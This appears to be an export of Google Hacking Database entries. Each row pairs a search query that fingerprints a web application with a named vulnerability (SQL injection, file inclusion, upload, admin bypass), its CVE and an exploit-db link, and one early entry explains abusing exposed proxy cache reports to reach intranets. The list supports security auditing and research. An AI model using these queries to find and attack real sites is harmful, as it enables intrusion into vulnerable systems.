&quot;1&quot;;&quot;2003-06-24&quot;;&quot;"cacheserverreport for" "This analysis was produced by calamaris"&quot;;&quot;These are squid server cache reports. Fairly benign, really except when you consider using them for evil purposes. For example, an institution stands up a proxy server for their internal users to get to the outside world. Then, the internal user surf all over to their hearts content (including intranet pages cuz well, the admins are stupid) Voila, intranet links show up in the external cache report. Want to make matters worse for yourself as an admin? OK, configure your external proxy server as a trusted internal host. Load up your web browser, set your proxy as their proxy and surf your way into their intranet. Not that I&#039;ve noticed any examples of this in this google list. *COUGH* *COUGH* *COUGH*  unresolved DNS lookups give clues *COUGH* *COUGH* (&#039;scuse me. must be a furball) OK, lets say BEST CASE scenario. Let&#039;s say there&#039;s not security problems revealed in these logs. Best case scenario is that outsiders can see what your company/agency/workers are surfing.&quot;
&quot;2157&quot;;&quot;2010-11-15&quot;;&quot;"You have not provided a survey identification number"&quot;;&quot;LimeSurvey 1.52 (language.php) Remote File Inclusion Vulnerability - CVE: 2007-5573: http://www.exploit-db.com/exploits/4544&quot;
&quot;2158&quot;;&quot;2010-11-15&quot;;&quot;"Powered by SocketMail Lite version 2.2.8. Copyright Ã‚Â© 2002-2006"&quot;;&quot;SocketMail 2.2.8 fnc-readmail3.php Remote File Inclusion Vulnerability - CVE: 2007-5627: http://www.exploit-db.com/exploits/4554&quot;
&quot;2159&quot;;&quot;2010-11-15&quot;;&quot;"Powered by ComicShout"&quot;;&quot;ComicShout 2.8 (news.php news_id) SQL Injection Vulnerability - CVE: 2008-6425: http://www.exploit-db.com/exploits/5713&quot;
&quot;2160&quot;;&quot;2010-11-15&quot;;&quot;powered by Pixaria. Gallery&quot;;&quot;Pixaria Gallery 1.x (class.Smarty.php) Remote File Include Vulnerability - CVE: 2007-2457: http://www.exploit-db.com/exploits/3733&quot;
&quot;2161&quot;;&quot;2010-11-15&quot;;&quot;"Powered by FlashGameScript"&quot;;&quot;FlashGameScript 1.7 (user) Remote SQL Injection Vulnerability - CVE: 2007-3646: http://www.exploit-db.com/exploits/4161&quot;
&quot;2163&quot;;&quot;2010-11-15&quot;;&quot;index.php?option=com_ongallery&quot;;&quot;Joomla Component OnGallery SQL Injection Vulnerability: http://www.exploit-db.com/exploits/14659&quot;
&quot;2164&quot;;&quot;2010-11-15&quot;;&quot;Powered by WHMCompleteSolution - OR   inurl:WHMCS   OR     announcements.php &quot;;&quot;WHMCS Control 2 (announcements.php) SQL Injection: http://www.exploit-db.com/exploits/12481&quot;
&quot;2165&quot;;&quot;2010-11-15&quot;;&quot;inurl:inc_catalogmanager.asp&quot;;&quot;DMXReady Catalog Manager 1.1 Remote Contents Change Vuln: http://www.exploit-db.com/exploits/7766&quot;
&quot;2166&quot;;&quot;2010-11-15&quot;;&quot;"This website is powered by Trio"&quot;;&quot;TriO 2.1 (browse.php id) Remote SQL Injection Vulnerability - CVE: 2008-3418: http://www.exploit-db.com/exploits/6141&quot;
&quot;2169&quot;;&quot;2010-11-15&quot;;&quot;allinurl: "pollBooth.php?op=results"pollID&quot;;&quot;Pollbooth 2.0 (pollID) Remote SQL Injection Vulnerability: http://www.exploit-db.com/exploits/5436&quot;
&quot;2170&quot;;&quot;2010-11-15&quot;;&quot;browse_videos.php?&quot;;&quot;phpVID 0.9.9 (categories_type.php cat) SQL Injection Vulnerability - CVE: 2007-3610: http://www.exploit-db.com/exploits/4153&quot;
&quot;2172&quot;;&quot;2010-11-15&quot;;&quot;inurl:JBSPro&quot;;&quot;JiRos Banner Experience 1.0 (Create Admin Bypass) - CVE: 2006-1213: http://www.exploit-db.com/exploits/1571&quot;
&quot;2174&quot;;&quot;2010-11-15&quot;;&quot;inurl:inc_joblistingmanager.asp&quot;;&quot;DMXReady Job Listing 1.1 Remote Contents Change Vulnerability: http://www.exploit-db.com/exploits/7771&quot;
&quot;2175&quot;;&quot;2010-11-15&quot;;&quot;"Factux le facturier libre V 1.1.5" &quot;;&quot;Factux LFI Vulnerability: http://www.exploit-db.com/exploits/12521&quot;
&quot;2176&quot;;&quot;2010-11-15&quot;;&quot;Maintained with the Ocean12 Contact Manager Pro v1.02&quot;;&quot;Ocean12 Contact Manager Pro (SQL/XSS/DDV) Multiple Vulnerabilities - CVE: 2008-6369: http://www.exploit-db.com/exploits/7244&quot;
&quot;2177&quot;;&quot;2010-11-15&quot;;&quot;buyers_subcategories.php?IndustryID= &quot;;&quot;Softbiz B2B trading Marketplace Script buyers_subcategories SQL Injection Vulnerability: http://www.exploit-db.com/exploits/12245&quot;
&quot;2178&quot;;&quot;2010-11-15&quot;;&quot;"Powered by Minerva"&quot;;&quot;Minerva 2.0.21 build 238a (phpbb_root_path) File Include Vulnerability - CVE: 2006-5077: http://www.exploit-db.com/exploits/2429&quot;
&quot;2179&quot;;&quot;2010-11-15&quot;;&quot;inurl:"izle.asp?oyun="&quot;;&quot;FoT Video scripti 1.1b (oyun) Remote SQL Injection Vulnerability - CVE: 2008-4176: http://www.exploit-db.com/exploits/6453&quot;
&quot;2180&quot;;&quot;2010-11-15&quot;;&quot;Copyright Ã‚Â© Viral Marketing 2008&quot;;&quot;YourFreeWorld Viral Marketing (id) SQL Injection Vulnerability: http://www.exploit-db.com/exploits/6941&quot;
&quot;2181&quot;;&quot;2010-11-15&quot;;&quot;inurl:"IDFM=" "form.php"&quot;;&quot;360 Web Manager 3.0 (IDFM) SQL Injection Vulnerability - CVE: 2008-0430: http://www.exploit-db.com/exploits/4944&quot;
&quot;2182&quot;;&quot;2010-11-15&quot;;&quot;inurl:inc_newsmanager.asp&quot;;&quot;DMXReady News Manager 1.1 Arbitrary Category Change Vuln: http://www.exploit-db.com/exploits/7752&quot;
&quot;2183&quot;;&quot;2010-11-15&quot;;&quot;Powered by XAOS systems &quot;;&quot;XAOS CMS SQL Injection Vulnerability: http://www.exploit-db.com/exploits/14469&quot;
&quot;2184&quot;;&quot;2010-11-15&quot;;&quot;inurl:inc_documentlibrarymanager.asp&quot;;&quot;DMXReady Document Library Manager 1.1 Contents Change Vuln: http://www.exploit-db.com/exploits/7769&quot;
&quot;2185&quot;;&quot;2010-11-15&quot;;&quot;inurl:inc_photogallerymanager.asp&quot;;&quot;DMXReady Photo Gallery Manager 1.1 Contents Change Vulnerability: http://www.exploit-db.com/exploits/7783&quot;
&quot;2186&quot;;&quot;2010-11-15&quot;;&quot;Powered by Arctic v2.0.0&quot;;&quot;Artic Issue Tracker 2.0.0 (index.php filter) SQL Injection Vulnerability - CVE: 2008-3250: http://www.exploit-db.com/exploits/6097&quot;
&quot;2187&quot;;&quot;2010-11-15&quot;;&quot;inurl:"phpRaid"  "phpRaid" "roster.php?Sort=Race"&quot;;&quot;phpRaid 3.0.7 (rss.php phpraid_dir) Remote File Inclusion: http://www.exploit-db.com/exploits/3528&quot;
&quot;2189&quot;;&quot;2010-11-15&quot;;&quot;inurl:"classifieds.php?cat=" &quot;;&quot;BM Classifieds Ads SQL Injection Vulnerability: http://www.exploit-db.com/exploits/10314&quot;
&quot;2190&quot;;&quot;2010-11-15&quot;;&quot;Powered by: Zanfi Solutions&quot;;&quot;Zanfi CMS lite 1.2 Multiple Local File Inclusion Vulnerabilities - CVE: 2008-4158: http://www.exploit-db.com/exploits/6413&quot;
&quot;2191&quot;;&quot;2010-11-15&quot;;&quot;inurl:"index.php?option=com_jequoteform" &quot;;&quot;Joomla Component com_jequoteform - Local File Inclusion - CVE: 2010-2128: http://www.exploit-db.com/exploits/12607&quot;
&quot;2192&quot;;&quot;2010-11-15&quot;;&quot;"Powered by SiteX 0.7 Beta"   &quot;;&quot;SiteX 0.7.4.418 (THEME_FOLDER) Local File Inclusion Vulnerabilities - CVE: 2009-1846: http://www.exploit-db.com/exploits/8816&quot;
&quot;2193&quot;;&quot;2010-11-15&quot;;&quot;inurl:"freshlinks_panel/index.php?linkid"&quot;;&quot;PHP-Fusion Mod freshlinks (linkid) Remote SQL Injection Vuln - CVE: 2008-5074: http://www.exploit-db.com/exploits/6620&quot;
&quot;2194&quot;;&quot;2010-11-15&quot;;&quot;Powered By WebSihirbazÃ„Â±&quot;;&quot;WebSihirbazi 5.1.1 (pageid) Remote SQL Injection Vulnerability - CVE: 2007-6556: http://www.exploit-db.com/exploits/4777&quot;
&quot;2196&quot;;&quot;2010-11-15&quot;;&quot;"Software Categories" "Featured Resources" "Search"&quot;;&quot;HotScripts Clone Script Remote SQL Injection Vulnerability - CVE: 2007-6084: http://www.exploit-db.com/exploits/4633&quot;
&quot;2197&quot;;&quot;2010-11-15&quot;;&quot;"Website Powered By Creative SplashWorks - SplashSite" &quot;;&quot;Creative SplashWorks-SplashSite (page.php) Blind Sql Injection Vulnerability: http://www.exploit-db.com/exploits/11300&quot;
&quot;2199&quot;;&quot;2010-11-15&quot;;&quot;inurl:inc_paypalstoremanager.asp&quot;;&quot;DMXReady PayPal Store Manager 1.1 Contents Change Vulnerability: http://www.exploit-db.com/exploits/7782&quot;
&quot;2200&quot;;&quot;2010-11-15&quot;;&quot;Powered By phpCOIN 1.2.3&quot;;&quot;phpCOIN 1.2.3 (session_set.php) Remote Include Vulnerability - CVE: 2006-4424: http://www.exploit-db.com/exploits/2254&quot;
&quot;2201&quot;;&quot;2010-11-15&quot;;&quot;inurl:"index.php?com_remository" &quot;;&quot;Joomla Component (com_remository) Remote Upload File: http://www.exploit-db.com/exploits/14811&quot;
&quot;2202&quot;;&quot;2010-11-15&quot;;&quot;Powered By: Â© Simplicity oF Upload &quot;;&quot;Simplicity oF Upload (1.3.2) Remote File Upload Vulnerability - CVE: 2009-4818: http://www.exploit-db.com/exploits/10568&quot;
&quot;2203&quot;;&quot;2010-11-15&quot;;&quot;"Developed by Quate.net."&quot;;&quot;Grape Statistics 0.2a (location) Remote File Inclusion Vulnerability - CVE: 2008-1963: http://www.exploit-db.com/exploits/5463&quot;
&quot;2206&quot;;&quot;2010-11-15&quot;;&quot;allinurl:directory.php?ax=list&quot;;&quot;Prozilla Directory Script (directory.php cat_id) SQL Injection Vulnerbility - CVE: 2007-3809: http://www.exploit-db.com/exploits/4185&quot;
&quot;2207&quot;;&quot;2010-11-15&quot;;&quot;inurl:w3.php?nodeId= &quot;;&quot;Aspect Ratio CMS Blind SQL Injection Vulnerability: http://www.exploit-db.com/exploits/15205&quot;
&quot;2208&quot;;&quot;2010-11-15&quot;;&quot;VS-GÃ¤stebuch V. Â©&quot;;&quot;S-Gastebuch 1.5.3 (gb_pfad) Remote File Include - CVE: 2007-1011: http://www.exploit-db.com/exploits/3328&quot;
&quot;2209&quot;;&quot;2010-11-15&quot;;&quot;Uebimiau Webmail v3.2.0-1.8&quot;;&quot;Uebimiau Web-Mail v3.2.0-1.8 Remote File / Overwrite Vulnerabilities: http://www.exploit-db.com/exploits/8944&quot;
&quot;2210&quot;;&quot;2010-11-15&quot;;&quot;Ã‚Â© 2007 by Lama Software - Accomm Solutions GmbH & Co. KG&quot;;&quot;Lama Software (14.12.2007) Multiple Remote File Inclusion Vulnerabilities - CVE: 2008-0423: http://www.exploit-db.com/exploits/4955&quot;
&quot;2211&quot;;&quot;2010-11-15&quot;;&quot;"ATutor 1.6.4" &quot;;&quot;ATutor 1.6.4 Multiple Cross Site Scripting - CVE: 2010-0971: http://www.exploit-db.com/exploits/11685&quot;
&quot;2214&quot;;&quot;2010-11-15&quot;;&quot;inurl:"index.php?option=com_portfolio"&quot;;&quot;Mambo Component Portfolio 1.0 (categoryId) SQL Injection Vulnerability: http://www.exploit-db.com/exploits/5139&quot;
&quot;2215&quot;;&quot;2010-11-15&quot;;&quot;Powered by Article DashBoard&quot;;&quot;Article Friendly SQL Injection Vulnerability: http://www.exploit-db.com/exploits/11530&quot;
&quot;2216&quot;;&quot;2010-11-15&quot;;&quot;elkagroup - Image Gallery v1.0 -  All right reserved&quot;;&quot;elkagroup Image Gallery 1.0 Arbitrary File Upload Vulnerability - CVE: 2009-1446: http://www.exploit-db.com/exploits/8514&quot;
&quot;2219&quot;;&quot;2010-11-15&quot;;&quot;inurl:post.php?Category=Garage &quot;;&quot;GarageSales Remote Upload Vulnerability: http://www.exploit-db.com/exploits/12128&quot;
&quot;2221&quot;;&quot;2010-11-15&quot;;&quot;intext:"Powered by CLscript.com" &quot;;&quot;CLScript.com Classifieds Software SQL Injection Vunerability - CVE: 2010-1660: http://www.exploit-db.com/exploits/12423&quot;
&quot;2222&quot;;&quot;2010-11-15&quot;;&quot;"Send amazing greetings to your friends and relative!" &quot;;&quot;greeting card Remote Upload Vulnerability: http://www.exploit-db.com/exploits/13751&quot;
&quot;2223&quot;;&quot;2010-11-15&quot;;&quot;inurl:"index.php?option=com_oziogallery" &quot;;&quot;Joomla Ozio Gallery Component (com_oziogallery) SQL Injection Vulnerability - CVE: 2010-2910: http://www.exploit-db.com/exploits/14462&quot;
&quot;2224&quot;;&quot;2010-11-15&quot;;&quot;"Powered by Content Injector v1.53"&quot;;&quot;Content Injector 1.53 (index.php) Remote SQL Injection Vulnerability - CVE: 2007-6394: http://www.exploit-db.com/exploits/4706&quot;
&quot;2225&quot;;&quot;2010-11-15&quot;;&quot;inurl:tabid/176/Default.aspx OR inurl:portals/0/&quot;;&quot;DotNetNuke Remote File upload Vulnerability: http://www.exploit-db.com/exploits/12700&quot;
&quot;2226&quot;;&quot;2010-11-15&quot;;&quot;inurl:"click.php?hostid="&quot;;&quot;Adult Banner Exchange Website (targetid) SQL Injection Vulnerability - CVE: 2008-6101: http://www.exploit-db.com/exploits/6909&quot;
&quot;2227&quot;;&quot;2010-11-15&quot;;&quot;inurl:/tiny_mce/plugins/filemanager/ &quot;;&quot;TinyMCE MCFileManager 2.1.2 Arbitrary File Upload Vulnerability: http://www.exploit-db.com/exploits/15194&quot;
&quot;2229&quot;;&quot;2010-11-15&quot;;&quot;inurl:"search_results.php?browse=1" &quot;;&quot;SoftBizScripts Dating Script SQL Injection Vunerability - CVE: 2006-3271: http://www.exploit-db.com/exploits/12438&quot;
&quot;2230&quot;;&quot;2010-11-15&quot;;&quot;"powered by fuzzylime" &quot;;&quot;fuzzylime cms 3.01 (admindir) Remote File Inclusion Vulnerability - CVE: 2008-1405: http://www.exploit-db.com/exploits/5260&quot;
&quot;2231&quot;;&quot;2010-11-15&quot;;&quot;Powered by ThinkAdmin &quot;;&quot;ThinkAdmin (page.php) Sql Injection Vulnerability: http://www.exploit-db.com/exploits/11296&quot;
&quot;2232&quot;;&quot;2010-11-15&quot;;&quot;phpBazar Ver. 2.1.0 &quot;;&quot;phpBazar-2.1.1fix Remote Administration-Panel Vulnerability - CVE: 2009-4222: http://www.exploit-db.com/exploits/10233&quot;
&quot;2233&quot;;&quot;2010-11-15&quot;;&quot;inurl:gotourl.php?id=&quot;;&quot;PozScripts Classified Auctions (gotourl.php id) SQL Injection Vuln - CVE: 2008-4755: http://www.exploit-db.com/exploits/6839&quot;
&quot;2234&quot;;&quot;2010-11-15&quot;;&quot;inurl:"module=helpcenter" &quot;;&quot;Help Center Live 2.0.6(module=helpcenter&file=) Local File Inclusion - CVE: 2010-1652: http://www.exploit-db.com/exploits/12421&quot;
&quot;2235&quot;;&quot;2010-11-15&quot;;&quot;Powered By PHPhotoalbum&quot;;&quot;PHPhotoalbum Remote File Upload Vulnerability - CVE: 2009-4819: http://www.exploit-db.com/exploits/10584&quot;
&quot;2236&quot;;&quot;2010-11-15&quot;;&quot;"Eyeland Studio Inc. All Rights Reserved." &quot;;&quot;Eyeland Studio Inc. SQL Injection Vulnerability: http://www.exploit-db.com/exploits/13855&quot;
&quot;2237&quot;;&quot;2010-11-15&quot;;&quot;"Gallery powered by fMoblog"&quot;;&quot;Wordpress Plugin fMoblog 2.1 (id) SQL Injection Vulnerability - CVE: 2009-0968: http://www.exploit-db.com/exploits/8229&quot;
&quot;2239&quot;;&quot;2010-11-15&quot;;&quot;"Powered by Orca Interactive Forum Script"&quot;;&quot;Orca 2.0/2.0.2 (params.php) Remote File Inclusion Vulnerability - CVE: 2008-5167: http://www.exploit-db.com/exploits/5955&quot;
&quot;2240&quot;;&quot;2010-11-15&quot;;&quot;Powered by Info Fisier&quot;;&quot;Info Fisier v1.0 SQL Injection Vulnerability: http://www.exploit-db.com/exploits/10726&quot;
&quot;2242&quot;;&quot;2010-11-15&quot;;&quot;inurl:"browsecats.php?cid=" &quot;;&quot;SoftBizScripts Hosting Script SQL Injection Vunerability - CVE: 2005-3817: http://www.exploit-db.com/exploits/12439&quot;
&quot;2243&quot;;&quot;2010-11-15&quot;;&quot;"Powered by MySpace Content Zone"&quot;;&quot;MySpace Content Zone 3.x Remote File Upload Vulnerability - CVE: 2007-6668: http://www.exploit-db.com/exploits/4741&quot;
&quot;2244&quot;;&quot;2010-11-15&quot;;&quot;allinurl: "com_actualite"&quot;;&quot;Joomla Component actualite 1.0 (id) SQL Injection Vulnerability - CVE: 2008-4617: http://www.exploit-db.com/exploits/5337&quot;
&quot;2245&quot;;&quot;2010-11-15&quot;;&quot;inurl:"com_book"&quot;;&quot;Joomla Component com_book SQL injection Vulnerability: http://www.exploit-db.com/exploits/11213&quot;
&quot;2246&quot;;&quot;2010-11-15&quot;;&quot;"powered by AllMyGuests"&quot;;&quot;AllMyGuests 0.4.1 (AMG_id) Remote SQL Injection Vulnerability - CVE: 2008-1961: http://www.exploit-db.com/exploits/5469&quot;
&quot;2248&quot;;&quot;2010-11-15&quot;;&quot;allinurl : /web3news/&quot;;&quot;Web3news 0.95 (PHPSECURITYADMIN_PATH) Remote Include Vuln - CVE: 2006-4452: http://www.exploit-db.com/exploits/2269&quot;
&quot;2249&quot;;&quot;2010-11-15&quot;;&quot;Powered by BoutikOneÂ® &quot;;&quot;BoutikOne v1 SQL Injection Vulnerability - CVE: 2010-3479: http://www.exploit-db.com/exploits/15049&quot;
&quot;2251&quot;;&quot;2010-11-15&quot;;&quot;" Powered by Xpoze "&quot;;&quot;Xpoze 4.10 (home.html menu) Blind SQL Injection Vulnerability - CVE: 2008-6352: http://www.exploit-db.com/exploits/7432&quot;
&quot;2253&quot;;&quot;2010-11-15&quot;;&quot;Powered by ArticleMS from ArticleTrader&quot;;&quot;Article Management System 2.1.2 Reinstall Vulnerability: http://www.exploit-db.com/exploits/12858&quot;
&quot;2254&quot;;&quot;2010-11-15&quot;;&quot;allinurl:"macgurublog.php?uid="&quot;;&quot;e107 Plugin BLOG Engine 2.1.4 Remote SQL Injection Vulnerability - CVE: 2008-6438: http://www.exploit-db.com/exploits/6856&quot;
&quot;2255&quot;;&quot;2010-11-15&quot;;&quot;"powered by Sniggabo CMS" inurl:article.php?id&quot;;&quot;Sniggabo CMS (article.php id) Remote SQL Injection: http://www.exploit-db.com/exploits/8933&quot;
&quot;2256&quot;;&quot;2010-11-15&quot;;&quot;inurl:"tr.php?id=" Short Url & Url Tracker&quot;;&quot;YourFreeWorld Short Url & Url Tracker (id) SQL Injection Vuln - CVE: 2008-4885: http://www.exploit-db.com/exploits/6940&quot;
&quot;2257&quot;;&quot;2010-11-15&quot;;&quot;powered by AirvaeCommerce 3.0&quot;;&quot;AirvaeCommerce 3.0 (pid) Remote SQL Injection Vulnerability - CVE: 2008-5223: http://www.exploit-db.com/exploits/5689&quot;
&quot;2258&quot;;&quot;2010-11-15&quot;;&quot;inurl: "tops_top.php? id_cat ="&quot;;&quot;Million Pixels 3 (id_cat) Remote SQL Injection Vulnerability - CVE: 2008-3204: http://www.exploit-db.com/exploits/6044&quot;
&quot;2259&quot;;&quot;2010-11-15&quot;;&quot;PHPEmailManager&quot;;&quot;PHP Email Manager (remove.php ID) SQL Injection Vulnerability - CVE: 2009-3209: http://www.exploit-db.com/exploits/9470&quot;
&quot;2260&quot;;&quot;2010-11-15&quot;;&quot;"Powered By 0DayDB v2.3"&quot;;&quot;0DayDB 2.3 (delete id) Remote Admin Bypass: http://www.exploit-db.com/exploits/4896&quot;
&quot;2261&quot;;&quot;2010-11-15&quot;;&quot;"Powered by ExBB "&quot;;&quot;ExBB Italiano 0.2 exbb[home_path] Remote File Include Vulnerability - CVE: 2006-4488: http://www.exploit-db.com/exploits/2273&quot;
&quot;2262&quot;;&quot;2010-11-15&quot;;&quot;"Powered by Locazolist Copyright Â© 2006"&quot;;&quot;LocazoList 2.01a beta5 (subcatID) Remote SQL Injection Vulnerability - CVE: 2007-0129: http://www.exploit-db.com/exploits/3073&quot;
&quot;2264&quot;;&quot;2010-11-15&quot;;&quot;intext:"Powered by Max.Blog" &quot;;&quot;Max.Blog 1.0.6 (show_post.php) SQL Injection Vulnerability: http://www.exploit-db.com/exploits/7885&quot;
&quot;2265&quot;;&quot;2010-11-15&quot;;&quot;"Powered by Active PHP Bookmarks v1.3" inurl:.view_group.php?id= &quot;;&quot;Active PHP Bookmarks v1.3 SQL Injection Vulnerability - CVE: 2008-3748: http://www.exploit-db.com/exploits/10597&quot;
&quot;2266&quot;;&quot;2010-11-15&quot;;&quot;"txx cms"&quot;;&quot;Txx CMS 0.2 Multiple Remote File Inclusion Vulnerabilities - CVE: 2007-4819: http://www.exploit-db.com/exploits/4381&quot;
&quot;2267&quot;;&quot;2010-11-15&quot;;&quot;Powered by: XP Book v3.0&quot;;&quot;XP Book v3.0 login Admin: http://www.exploit-db.com/exploits/10621&quot;
&quot;2268&quot;;&quot;2010-11-15&quot;;&quot;"Powered by ispCP Omega" &quot;;&quot;ispCP Omega 1.0.4 Remote File Include Vulnerability: http://www.exploit-db.com/exploits/11681&quot;
&quot;2269&quot;;&quot;2010-11-15&quot;;&quot;inurl:"printer.asp?forum="&quot;;&quot;ASP Message Board 2.2.1c Remote SQL Injection Vulnerability - CVE: 2007-5887: http://www.exploit-db.com/exploits/4609&quot;
&quot;2270&quot;;&quot;2010-11-15&quot;;&quot;inurl:"com_ownbiblio" catalogue&quot;;&quot;Joomla Component ownbiblio 1.5.3 (catid) SQL Injection Vulnerability - CVE: 2008-6184: http://www.exploit-db.com/exploits/6730&quot;
&quot;2271&quot;;&quot;2010-11-15&quot;;&quot;"This site is powered by CMS Made Simple version 1."&quot;;&quot;CMS Made Simple 1.6.2 Local File Disclosure Vulnerability: http://www.exploit-db.com/exploits/9407&quot;
&quot;2272&quot;;&quot;2010-11-15&quot;;&quot;"CMS Webmanager-pro"&quot;;&quot;CMS WebManager-Pro Multiple Remote SQL Injection Vulnerabilities - CVE: 2008-2351: http://www.exploit-db.com/exploits/5641&quot;
&quot;2274&quot;;&quot;2010-11-15&quot;;&quot;inurl:"/geeklog/"&quot;;&quot;GeekLog 1.7.0 (fckeditor) Arbitrary File Upload Vulnerability: http://www.exploit-db.com/exploits/15277&quot;
&quot;2276&quot;;&quot;2010-11-15&quot;;&quot; "Jax Calendar v1.34 by Jack (tR), www.jtr.de/scripting/php"&quot;;&quot;Jax Calendar 1.34 Remote Admin Access: http://www.exploit-db.com/exploits/10835&quot;
&quot;2277&quot;;&quot;2010-11-15&quot;;&quot;allinurl: "index php p shop"categ&quot;;&quot;Koobi Pro 6.25 shop Remote SQL Injection Vulnerability: http://www.exploit-db.com/exploits/5412&quot;
&quot;2278&quot;;&quot;2010-11-15&quot;;&quot;Powered by Platinum 7.6.b.5&quot;;&quot;PHP-Nuke Platinum 7.6.b.5 Remote File Inclusion Vulnerability - CVE: 2007-5676: http://www.exploit-db.com/exploits/4563&quot;
&quot;2280&quot;;&quot;2010-11-15&quot;;&quot;Rash Version: 1.2.1&quot;;&quot;RQMS (Rash) 1.2.2 Multiple SQL Injection Vulnerabilities: http://www.exploit-db.com/exploits/8433&quot;
